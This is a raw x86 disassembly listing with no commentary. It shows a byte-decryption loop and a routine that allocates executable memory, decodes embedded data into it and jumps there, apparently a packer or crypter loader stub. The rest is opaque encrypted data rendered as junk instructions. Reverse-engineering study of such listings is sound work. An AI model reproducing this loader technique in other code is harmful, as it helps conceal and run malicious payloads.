  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428100
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x428104
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428108
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x42810c
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f0
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280f4
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x4280f8
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x4280fc
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x4280fe
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	cmp    DWORD PTR [ebp+0x8],0x0
  421630:	jne    0x42163b
  421632:	mov    eax,DWORD PTR [ebp-0x10]
  421635:	add    eax,0x1
  421638:	mov    DWORD PTR [ebp-0x10],eax
  42163b:	mov    DWORD PTR [ebp-0x48],0x0
  421642:	mov    DWORD PTR [ebp-0x4c],0x0
  421649:	push   0x1
  42164b:	lea    ecx,[ebp-0x14]
  42164e:	push   ecx
  42164f:	call   DWORD PTR ds:0x428000
  421655:	mov    BYTE PTR [ebp-0x40],0x56
  421659:	call   DWORD PTR ds:0x428010
  42165f:	mov    DWORD PTR [ebp-0x2c],eax
  421662:	mov    BYTE PTR [ebp-0x3e],0x72
  421666:	movzx  edx,WORD PTR [ebp-0x2c]
  42166a:	test   edx,edx
  42166c:	jne    0x4216ae
  42166e:	mov    BYTE PTR [ebp-0x34],0x0
  421672:	mov    DWORD PTR [ebp-0x14],0xe0d
  421679:	lea    eax,[ebp-0x28]
  42167c:	push   eax
  42167d:	call   DWORD PTR ds:0x428014
  421683:	mov    DWORD PTR [ebp-0x68],eax
  421686:	mov    DWORD PTR [ebp-0x5c],0x3a
  42168d:	lea    ecx,[ebp-0x40]
  421690:	push   ecx
  421691:	mov    edx,DWORD PTR [ebp-0x68]
  421694:	push   edx
  421695:	call   DWORD PTR ds:0x428018
  42169b:	mov    DWORD PTR [ebp-0x44],eax
  42169e:	mov    DWORD PTR [ebp-0x8],0x89cfd226
  4216a5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216ac:	jmp    0x4216c3
  4216ae:	mov    BYTE PTR ds:0x443a58,0x0
  4216b5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216bc:	mov    BYTE PTR ds:0x441b18,0x0
  4216c3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216ca:	push   DWORD PTR ds:0x428014
  4216d0:	pop    edx
  4216d1:	mov    DWORD PTR [ebp-0x74],edx
  4216d4:	push   DWORD PTR [ebp-0x30]
  4216d7:	push   0x1000
  4216dc:	mov    eax,DWORD PTR [ebp-0x14]
  4216df:	add    eax,0x23
  4216e2:	add    eax,0x23
  4216e5:	push   eax
  4216e6:	xor    eax,eax
  4216e8:	push   eax
  4216e9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216ec:	call   ecx
  4216ee:	mov    edx,eax
  4216f0:	mov    DWORD PTR [ebp-0x4],edx
  4216f3:	mov    eax,DWORD PTR [ebp-0x70]
  4216f6:	sub    eax,0xdae0b
  4216fb:	mov    DWORD PTR [ebp-0x70],eax
  4216fe:	cmp    DWORD PTR [ebp-0x4],0x0
  421702:	jne    0x42170b
  421704:	mov    BYTE PTR ds:0x441b18,0x0
  42170b:	mov    ecx,DWORD PTR [ebp-0x4]
  42170e:	add    ecx,DWORD PTR [ebp-0x14]
  421711:	mov    edx,DWORD PTR [ebp-0x8]
  421714:	mov    DWORD PTR [ecx],edx
  421716:	mov    eax,DWORD PTR [ebp-0x4]
  421719:	add    eax,DWORD PTR [ebp-0x5c]
  42171c:	mov    DWORD PTR [ebp-0x64],eax
  42171f:	mov    ecx,DWORD PTR ds:0x428018
  421725:	mov    DWORD PTR [ebp-0x54],ecx
  421728:	mov    edx,DWORD PTR [ebp-0x4]
  42172b:	add    edx,DWORD PTR [ebp-0x14]
  42172e:	mov    eax,DWORD PTR [ebp+0x8]
  421731:	mov    DWORD PTR [edx+0x4],eax
  421734:	mov    ecx,DWORD PTR [ebp-0x4]
  421737:	add    ecx,DWORD PTR [ebp-0x14]
  42173a:	mov    DWORD PTR [ebp-0xc],ecx
  42173d:	cmp    DWORD PTR [ebp-0x70],0x0
  421741:	jbe    0x42175e
  421743:	mov    edx,DWORD PTR [ebp-0xc]
  421746:	push   edx
  421747:	mov    eax,DWORD PTR [ebp-0x14]
  42174a:	push   eax
  42174b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42174e:	add    ecx,DWORD PTR [ebp-0x70]
  421751:	push   ecx
  421752:	mov    edx,DWORD PTR [ebp-0x4]
  421755:	push   edx
  421756:	call   0x4214d0
  42175b:	add    esp,0x10
  42175e:	cmp    DWORD PTR [ebp-0x64],0x0
  421762:	je     0x421776
  421764:	mov    ecx,DWORD PTR [ebp-0x54]
  421767:	push   ecx
  421768:	push   DWORD PTR [ebp-0x74]
  42176b:	mov    esi,DWORD PTR [ebp-0x64]
  42176e:	push   edx
  42176f:	pop    eax
  421770:	push   ecx
  421771:	nop
  421772:	jmp    esi
  421774:	jmp    0x42177c
  421776:	mov    eax,DWORD PTR [ebp+0x8]
  421779:	mov    DWORD PTR [ebp-0x18],eax
  42177c:	mov    eax,0x1
  421781:	pop    esi
  421782:	mov    esp,ebp
  421784:	pop    ebp
  421785:	ret    
  421786:	int3   
  421787:	int3   
  421788:	int3   
  421789:	int3   
  42178a:	int3   
  42178b:	int3   
  42178c:	int3   
  42178d:	int3   
  42178e:	int3   
  42178f:	int3   
  421790:	push   ebp
  421791:	mov    ebp,esp
  421793:	sub    esp,0x18
  421796:	lea    eax,[ebp-0x18]
  421799:	push   eax
  42179a:	call   DWORD PTR ds:0x42800c
  4217a0:	cmp    WORD PTR [ebp-0x18],0x0
  4217a5:	je     0x4217e8
  4217a7:	mov    ecx,DWORD PTR ds:0x428010
  4217ad:	push   0x0
  4217af:	push   0xb2
  4217b4:	push   0x82
  4217b9:	push   0x0
  4217bb:	mov    DWORD PTR [ebp-0x4],ecx
  4217be:	call   DWORD PTR ds:0x428008
  4217c4:	push   DWORD PTR [ebp-0x4]
  4217c7:	pop    edx
  4217c8:	call   edx
  4217ca:	push   eax
  4217cb:	pop    DWORD PTR [ebp-0x8]
  4217ce:	push   0x407ccb89
  4217d3:	call   0x421550
  4217d8:	add    esp,0x4
  4217db:	call   0x411000
  4217e0:	xor    eax,eax
  4217e2:	mov    esp,ebp
  4217e4:	pop    ebp
  4217e5:	ret    0x10
  4217e8:	jmp    DWORD PTR [eax+0x3f]
  4217eb:	popa   
  4217ec:	dec    edi
  4217ed:	or     al,0x1
  4217ef:	cmp    ebp,DWORD PTR ds:[eax-0x23]
  4217f3:	add    al,0x2a
  4217f5:	pop    edi
  4217f6:	shl    BYTE PTR [ebp-0xf],cl
  4217f9:	test   DWORD PTR [edi],0x6c3b3e01
  4217ff:	fld    QWORD PTR [edx+ebp*2]
  421802:	mov    al,ds:0x4ff1652d
  421807:	invlpg BYTE PTR [esi]
  42180a:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  42180e:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421814:	invlpg BYTE PTR [esi]
  421817:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  42181b:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421821:	invlpg BYTE PTR [esi]
  421824:	cmp    edx,DWORD PTR [ebp+ebx*8+0x32ae2a04]
  42182b:	(bad)  
  42182d:	dec    edi
  42182e:	mov    ebx,0xd41af308
  421833:	fmul   QWORD PTR [eax-0x19]
  421836:	cmp    DWORD PTR [ecx+0xd],0x712f3c98
  42183d:	dec    esp
  42183e:	push   esp
  42183f:	or     ebp,DWORD PTR [edi+0x4e804765]
  421845:	add    al,0x9f
  421847:	and    DWORD PTR [eax+0x75],esp
  42184a:	push   ds
  42184b:	pop    ecx
  42184c:	or     ebp,edi
  42184e:	jbe    0x4218af
  421850:	into   
  421851:	or     eax,0x4b6f9f0c
  421856:	dec    esi
  421857:	ins    DWORD PTR es:[edi],dx
  421858:	sbb    eax,DWORD PTR [ecx]
  42185a:	mov    dl,0x60
  42185c:	dec    edi
  42185d:	mov    fs,WORD PTR [eax]
  42185f:	push   0x10f6bfb
  421864:	cmp    ebp,DWORD PTR ds:[ebp+ebx*8+0x4]
  421869:	sub    eax,0xb23cd139
  42186e:	mov    bh,0x9d
  421870:	or     edi,DWORD PTR [ebp-0x3d]
  421873:	(bad)  
  421874:	xlat   BYTE PTR ds:[ebx]
  421875:	inc    edi
  421876:	shl    BYTE PTR [edx],cl
  421878:	daa    
  421879:	cmp    eax,0x5e054394
  42187e:	(bad)  
  42187f:	test   eax,0x12618566
  421884:	stos   BYTE PTR es:[edi],al
  421885:	out    dx,eax
  421886:	popf   
  421887:	arpl   WORD PTR [ebp+0x57],ax
  42188a:	fs pop es
  42188c:	xor    DWORD PTR [eiz*1-0x5c73df6a],eax
  421893:	pop    esp
  421894:	sti    
  421895:	or     edi,esi
  421897:	xchg   ebx,eax
  421898:	xor    al,0x71
  42189a:	in     al,dx
  42189b:	int3   
  42189c:	push   cs
  42189d:	pusha  
  42189e:	pop    eax
  42189f:	mov    edi,0xecfbb6f
  4218a4:	or     esp,DWORD PTR [esi-0x3d]
  4218a7:	(bad)  
  4218a8:	xlat   BYTE PTR ds:[ebx]
  4218a9:	inc    edi
  4218aa:	shl    BYTE PTR [ebx],cl
  4218ac:	daa    
  4218ad:	dec    ebp
  4218ae:	or     ch,bl
  4218b0:	add    eax,0x66bbe6be
  4218b5:	nop
  4218b6:	cld    
  4218b7:	mov    eax,0xcc0075aa
  4218bc:	inc    ebp
  4218bd:	pop    es
  4218be:	stc    
  4218bf:	lods   al,BYTE PTR ds:[esi]
  4218c0:	xor    DWORD PTR [eax+edi*4],esi
  4218c3:	or     al,0x20
  4218c5:	loop   0x42189c
  4218c7:	idiv   ebx
  4218c9:	pop    ss
  4218ca:	push   0xe
  4218cc:	xor    al,0x79
  4218ce:	xchg   esp,eax
  4218cf:	dec    edi
  4218d0:	push   cs
  4218d1:	js     0x42189c
  4218d3:	dec    esi
  4218d4:	or     eax,0xb9db7b2
  4218d9:	cmp    ebp,DWORD PTR ds:[ebp+ebx*8+0x4]
  4218de:	sub    ah,BYTE PTR [eax+0x4fb4352d]
  4218e4:	cmovge edi,DWORD PTR [edi]
  4218e7:	cmp    DWORD PTR [ebp+edi*2-0x2c],ebp
  4218eb:	inc    ecx
  4218ec:	out    dx,eax
  4218ed:	sub    eax,0xf4ff165
  4218f2:	add    DWORD PTR [esi],edi
  4218f4:	cmp    ecx,DWORD PTR [ebp+ebx*8+0x2cab2b07]
  4218fb:	outs   dx,DWORD PTR ds:[esi]
  4218fc:	icebp  
  4218fd:	dec    edi
  4218fe:	loope  0x421905
  421900:	ds cmp edx,eax
  421903:	fild   DWORD PTR [edx+ebp*1]
  421906:	mov    al,ds:0xf2e0652d
  42190b:	invlpg BYTE PTR [esi]
  42190e:	sub    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421912:	sub    ah,BYTE PTR [ebp+0xef1652d]
  421918:	(bad)  
  42191a:	cmp    ebp,DWORD PTR cs:[ebp+ebx*8+0x6]
  42191f:	sub    ah,BYTE PTR [eax+0x4ff06528]
  421925:	invlpg BYTE PTR [esi]
  421928:	cmp    ebp,DWORD PTR [ecx-0x23]
  42192b:	add    eax,0x652da02a
  421930:	icebp  
  421931:	dec    edi
  421932:	pop    edi
  421933:	or     eax,0xdd683b3e
  421938:	add    al,0x2b
  42193a:	inc    esp
  42193b:	sub    BYTE PTR [ebp-0xd],ah
  42193e:	dec    edi
  42193f:	jno    0xddbe5483
  421945:	add    al,0x3a
  421947:	mov    al,ds:0x5ff1652d
  42194c:	(bad)  
  42194e:	cmp    ebp,DWORD PTR cs:[ebp+ebx*8+0x4]
  421953:	sub    ah,BYTE PTR [eax+0x4ff1653d]
  421959:	invlpg BYTE PTR [esi]
  42195c:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421960:	sub    dl,BYTE PTR [esp+edx*1+0x69]
  421964:	icebp  
  421965:	es or  al,0x1
  421968:	cmp    ebx,DWORD PTR ds:[esi+edx*8+0x2de96504]
  421970:	gs icebp 
  421972:	dec    edi
  421973:	invlpg BYTE PTR [esi]
  421976:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  42197a:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421980:	invlpg BYTE PTR [esi]
  421983:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421987:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  42198d:	invlpg BYTE PTR [esi]
  421990:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421994:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  42199a:	invlpg BYTE PTR [esi]
  42199d:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  4219a1:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  4219a7:	invlpg BYTE PTR [esi]
  4219aa:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  4219ae:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  4219b4:	invlpg BYTE PTR [esi]
  4219b7:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  4219bb:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  4219c1:	invlpg BYTE PTR [esi]
  4219c4:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  4219c8:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  4219ce:	invlpg BYTE PTR [esi]
  4219d1:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  4219d5:	sub    ah,BYTE PTR [eax+0x3bdf652d]
  4219db:	push   0x79
  4219dd:	dec    edx
  4219de:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  4219e2:	retf   0x2dab
  4219e5:	gs loope 0x421a37
  4219e8:	(bad)  
  4219ea:	jmp    0xa02a:0xdd6c3f
  4219f1:	jge    0x421a13
  4219f3:	mov    dl,0x7d
  4219f5:	pop    ebx
  4219f6:	dec    esi
  4219f7:	cmp    ebp,DWORD PTR ds:[ebp+ebx*8+0x4]
  4219fc:	sub    al,BYTE PTR [eax+0x6111652d]
  421a02:	jge    0x421a76
  421a04:	dec    esp
  421a05:	pop    eax
  421a06:	ins    BYTE PTR es:[edi],dx
  421a07:	fld    QWORD PTR [edx+ebp*1]
  421a0a:	shr    BYTE PTR ds:0x4bff165,0x1
  421a11:	ds popa 
  421a13:	ins    BYTE PTR es:[edi],dx
  421a14:	fld    QWORD PTR [edx+esi*8]
  421a17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a18:	sub    eax,0xf4ff165
  421a1d:	add    DWORD PTR [esi],edi
  421a1f:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421a23:	sub    ah,BYTE PTR [eax-0x500e9af3]
  421a29:	invlpg BYTE PTR [esi]
  421a2c:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421a30:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421a36:	invlpg BYTE PTR [esi]
  421a39:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421a3d:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421a43:	invlpg BYTE PTR [esi]
  421a46:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421a4a:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421a50:	invlpg BYTE PTR [esi]
  421a53:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421a57:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421a5d:	invlpg BYTE PTR [esi]
  421a60:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421a64:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421a6a:	invlpg BYTE PTR [esi]
  421a6d:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421a71:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421a77:	invlpg BYTE PTR [esi]
  421a7a:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421a7e:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421a84:	invlpg BYTE PTR [esi]
  421a87:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421a8b:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421a91:	invlpg BYTE PTR [esi]
  421a94:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421a98:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421a9e:	invlpg BYTE PTR [esi]
  421aa1:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421aa5:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421aab:	invlpg BYTE PTR [esi]
  421aae:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421ab2:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421ab8:	invlpg BYTE PTR [esi]
  421abb:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421abf:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421ac5:	invlpg BYTE PTR [esi]
  421ac8:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421acc:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421ad2:	invlpg BYTE PTR [esi]
  421ad5:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421ad9:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421adf:	invlpg BYTE PTR [esi]
  421ae2:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421ae6:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421aec:	invlpg BYTE PTR [esi]
  421aef:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421af3:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421af9:	invlpg BYTE PTR [esi]
  421afc:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421b00:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421b06:	invlpg BYTE PTR [esi]
  421b09:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421b0d:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421b13:	invlpg BYTE PTR [esi]
  421b16:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421b1a:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421b20:	invlpg BYTE PTR [esi]
  421b23:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421b27:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421b2d:	invlpg BYTE PTR [esi]
  421b30:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421b34:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421b3a:	invlpg BYTE PTR [esi]
  421b3d:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421b41:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421b47:	invlpg BYTE PTR [esi]
  421b4a:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421b4e:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421b54:	invlpg BYTE PTR [esi]
  421b57:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421b5b:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421b61:	invlpg BYTE PTR [esi]
  421b64:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421b68:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421b6e:	invlpg BYTE PTR [esi]
  421b71:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421b75:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421b7b:	invlpg BYTE PTR [esi]
  421b7e:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421b82:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421b88:	invlpg BYTE PTR [esi]
  421b8b:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421b8f:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421b95:	invlpg BYTE PTR [esi]
  421b98:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421b9c:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421ba2:	invlpg BYTE PTR [esi]
  421ba5:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421ba9:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421baf:	invlpg BYTE PTR [esi]
  421bb2:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421bb6:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421bbc:	invlpg BYTE PTR [esi]
  421bbf:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421bc3:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421bc9:	invlpg BYTE PTR [esi]
  421bcc:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421bd0:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421bd6:	invlpg BYTE PTR [esi]
  421bd9:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  421bdd:	sub    ah,BYTE PTR [eax+0x4ff1652d]
  421be3:	invlpg BYTE PTR [esi]
  421be6:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x6b]
  421bea:	sub    BYTE PTR [ebx+0x4ff14a2d],0x1f
  421bf1:	add    DWORD PTR [esi],edi
  421bf3:	adc    esi,ecx
  421bf5:	pop    es
  421bf6:	jne    0x421c44
  421bf8:	pop    edi
  421bf9:	add    bl,bh
  421bfb:	jbe    0x421c1c
  421bfd:	loop   0x421c36
  421bff:	(bad)  
  421c00:	sub    al,bl
  421c02:	dec    eax
  421c03:	bound  ebx,QWORD PTR [ebx+0x24]
  421c06:	ja     0x421c7e
  421c08:	inc    eax
  421c09:	clc    
  421c0a:	sbb    DWORD PTR [edx+ebx*8-0x4f],ebp
  421c0e:	in     eax,dx
  421c0f:	sbb    ebp,DWORD PTR [edx]
  421c11:	dec    eax
  421c12:	xor    BYTE PTR [edx],dl
  421c14:	pop    esp
  421c15:	ret    0xbe00
  421c18:	push   ss
  421c19:	sbb    al,0x3b
  421c1b:	dec    ebx
  421c1c:	jp     0x421baa
  421c1e:	jg     0x421c11
  421c20:	inc    eax
  421c21:	int3   
  421c22:	ret    
  421c23:	jb     0x421bf7
  421c25:	adc    eax,0x3635b8f
  421c2a:	and    BYTE PTR [ecx-0x215f0114],dl
  421c30:	mov    bh,0x91
  421c32:	or     edx,ecx
  421c34:	pop    edi
  421c35:	dec    esp
  421c36:	jle    0x421c43
  421c38:	fisttp DWORD PTR [edx]
  421c3a:	add    BYTE PTR [eax],ah
  421c3c:	mov    DWORD PTR [ecx],ecx
  421c3e:	pop    esi
  421c3f:	inc    edx
  421c40:	lock mov ch,BYTE PTR [edx]
  421c43:	hlt    
  421c44:	jns    0x421bfd
  421c46:	and    DWORD PTR [edi-0x79],esi
  421c49:	idiv   bl
  421c4b:	lea    esi,[edx]
  421c4d:	push   ebp
  421c4e:	fisttp WORD PTR [ebp+0x2d]
  421c51:	mov    eax,gs:0xdd718bc0
  421c57:	test   al,0xa4
  421c59:	sub    DWORD PTR [ebp-0x24],esi
  421c5c:	push   ebx
  421c5d:	jge    0x421c7e
  421c5f:	jne    0x421c73
  421c61:	xchg   edi,eax
  421c62:	and    ecx,DWORD PTR [ebp+0x34]
  421c65:	es inc ebx
  421c67:	adc    ah,al
  421c69:	pop    ebp
  421c6a:	in     al,dx
  421c6b:	enter  0xaf9d,0x43
  421c6f:	(bad)  
  421c70:	scas   eax,DWORD PTR es:[edi]
  421c71:	repnz and cl,BYTE PTR [ebx]
  421c74:	jnp    0x421c75
  421c76:	stc    
  421c77:	xchg   esp,eax
  421c78:	mov    ebx,DWORD PTR [ecx]
  421c7a:	les    edi,FWORD PTR [esi]
  421c7c:	adc    DWORD PTR [esi+0x67],esi
  421c7f:	dec    ebp
  421c80:	pop    ebp
  421c81:	mov    eax,0xe2f4186
  421c86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c87:	icebp  
  421c88:	xor    eax,0x45e0f7d6
  421c8d:	icebp  
  421c8e:	and    al,0xb2
  421c90:	sub    al,0x92
  421c92:	sbb    al,0x6
  421c94:	push   ss
  421c95:	(bad)  
  421c96:	fisttp QWORD PTR [ebx-0x4e0f669d]
  421c9c:	push   ecx
  421c9d:	pop    esp
  421c9e:	enter  0x2d2e,0xd5
  421ca2:	inc    esi
  421ca3:	xchg   edi,eax
  421ca4:	inc    ecx
  421ca5:	jno    0x421c44
  421ca7:	ret    0xc7f5
  421caa:	gs ret 
  421cac:	xchg   al,ch
  421cae:	jge    0x421c49
  421cb0:	inc    esi
  421cb1:	push   ds
  421cb2:	loopne 0x421c84
  421cb4:	shl    BYTE PTR [ecx-0x27ecc5ed],1
  421cba:	mov    esi,0x75857b7
  421cbf:	inc    ecx
  421cc0:	dec    eax
  421cc1:	cmc    
  421cc2:	sahf   
  421cc3:	sub    bh,ah
  421cc5:	jo     0x421c80
  421cc7:	mov    ebp,0x19382e28
  421ccc:	mov    eax,0x29721377
  421cd1:	mov    ah,BYTE PTR [ebx]
  421cd3:	jmp    0x421d4f
  421cd5:	push   eax
  421cd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421cd7:	adc    al,0x1a
  421cd9:	pop    esi
  421cda:	sti    
  421cdb:	fstp   st(7)
  421cdd:	sbb    ecx,DWORD PTR [esi]
  421cdf:	add    DWORD PTR ds:0x8c67dd0e,ebx
  421ce5:	int    0xcc
  421ce7:	xlat   BYTE PTR ds:[ebx]
  421ce8:	cmp    cl,BYTE PTR ds:0xd3b1ea68
  421cee:	fld    QWORD PTR [ecx+ebx*4]
  421cf1:	jecxz  0x421d4e
  421cf3:	push   ecx
  421cf4:	inc    esp
  421cf5:	enter  0x7aa0,0xac
  421cf9:	sti    
  421cfa:	retf   0x118d
  421cfd:	mov    ds,WORD PTR [ebx]
  421cff:	push   ebp
  421d00:	adc    eax,0x2731fd9f
  421d05:	(bad)  
  421d07:	cmp    BYTE PTR [ebx+0x685060dc],dh
  421d0d:	dec    edi
  421d0e:	fild   DWORD PTR [eax]
  421d10:	push   edi
  421d11:	pusha  
  421d12:	mov    ebx,0x2525932c
  421d17:	push   edi
  421d18:	mov    eax,ds:0x8bf47e30
  421d1d:	clc    
  421d1e:	mov    esi,0x4e3ac2d
  421d23:	jp     0x421d8f
  421d25:	xchg   esp,eax
  421d26:	inc    eax
  421d27:	mov    dh,0xae
  421d29:	adc    al,dh
  421d2b:	ds (bad) 
  421d2d:	sub    DWORD PTR [ecx+0x64],esi
  421d30:	ins    BYTE PTR es:[edi],dx
  421d31:	sbb    DWORD PTR [eax-0xa8e605a],esi
  421d37:	jb     0x421cca
  421d39:	pop    ebp
  421d3a:	push   ecx
